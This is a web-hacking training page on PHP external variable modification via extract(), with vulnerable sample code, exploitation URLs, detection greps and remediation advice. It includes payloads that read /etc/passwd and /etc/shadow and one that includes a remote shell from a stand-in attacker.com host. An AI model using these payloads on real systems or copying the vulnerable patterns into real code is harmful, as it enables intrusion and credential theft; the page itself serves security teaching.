---
layout: training-page
title: "External Variable Modification — Red Team Academy"
module: "Web Hacking"
tags:
  - php
  - extract
  - variable-injection
  - lfi
  - web
page_key: "web-external-variable-modification"
render_with_liquid: false
---

# External Variable Modification

External Variable Modification (CWE-473) occurs when a PHP application passes unsanitized user input to `extract()`, `import_request_variables()`, or similar functions that import values into the current variable scope. By default, `extract()` uses `EXTR_OVERWRITE`, meaning existing variables are silently replaced. Attackers can overwrite authentication flags, file paths, and global variables — enabling privilege escalation, authentication bypass, and local file inclusion.

## The extract() Vulnerability

The typical vulnerable pattern looks like this:

```
<?php
extract($_GET);
// or
extract($_POST);
// User-supplied keys become PHP variables, overwriting anything in scope
?>
```

### Attack 1 — Authentication Bypass

```
<?php
$authenticated = false;
extract($_GET);
if ($authenticated) {
    echo "Access granted!";
} else {
    echo "Access denied!";
}
?>
```

Exploitation — set `$authenticated` to a truthy value via GET parameter:

```
http://example.com/vuln.php?authenticated=true
http://example.com/vuln.php?authenticated=1
```

### Attack 2 — Local File Inclusion via Path Poisoning

```
<?php
$page = "config.php";
extract($_GET);
include "$page";
?>
```

Exploitation — override the `$page` variable to include arbitrary files:

```
http://example.com/vuln.php?page=../../etc/passwd
http://example.com/vuln.php?page=../../etc/shadow
http://example.com/vuln.php?page=http://attacker.com/shell.php
```

### Attack 3 — Global Variable Injection (PHP < 8.1)

Before PHP 8.1, write access to `$GLOBALS` was unrestricted. Calling `extract($_GET)` allowed overwriting arbitrary global variables:

```
http://example.com/vuln.php?GLOBALS[admin]=1
http://example.com/vuln.php?GLOBALS[db_pass]=attacker
```

Note: As of PHP 8.1.0, write access to the entire `$GLOBALS` array is no longer supported.

## Chaining to RCE

If a file path variable is overwritten and the application later passes it to a function like `include`, `require`, `file_get_contents`, or `system`, the impact escalates to RCE:

```
<?php
extract($_POST);
// Attacker sets $cmd = "id"
system($cmd);
?>
```

## Identification

During code review or black-box testing, look for PHP applications that accept query parameters matching internal variable names, or behave differently when unexpected parameters are added. Grep the source for these dangerous patterns:

```
extract($_GET);
extract($_POST);
extract($_REQUEST);
import_request_variables();
```

## Remediation

Use `EXTR_SKIP` to prevent overwriting existing variables:

```
<?php
extract($_GET, EXTR_SKIP);
?>
```

Better yet, avoid `extract()` entirely. Access user input directly from `$_GET` or `$_POST` with explicit validation:

```
<?php
$page = isset($_GET['page']) ? basename($_GET['page']) : 'default.php';
// validate against an allowlist
$allowed_pages = ['home', 'about', 'contact'];
if (!in_array($page, $allowed_pages)) {
    $page = 'default.php';
}
include $page;
?>
```

## Resources

- CWE-473: PHP External Variable Modification — `cwe.mitre.org/data/definitions/473.html`
- CWE-621: Variable Extraction Error — `cwe.mitre.org/data/definitions/621.html`
- PHP extract() Documentation — `php.net/manual/en/function.extract.php`
- PHP $GLOBALS — `php.net/manual/en/reserved.variables.globals.php`
- CTF Writeup: The Ducks — HackThisSite — `github.com/HackThisSite/CTF-Writeups/blob/master/2016/SCTF/Ducks/README.md`
